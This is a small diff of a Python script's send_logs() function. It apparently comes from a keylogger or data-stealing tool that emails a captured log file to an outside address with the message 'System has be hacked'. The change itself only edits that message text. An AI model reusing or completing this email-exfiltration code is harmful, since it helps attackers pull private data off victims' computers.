@@ -96,7 +96,7 @@ def send_logs():
 				msg['From'] = fromAddr
 				msg['To'] = toAddr
 				msg['Subject'] = subject
-				body = 'Systen has be hacked'
+				body = 'System has be hacked 😎😎😎'
 				msg.attach(MIMEText(body,'plain'))
 
 				attachment = open(delete_file[0],'rb')
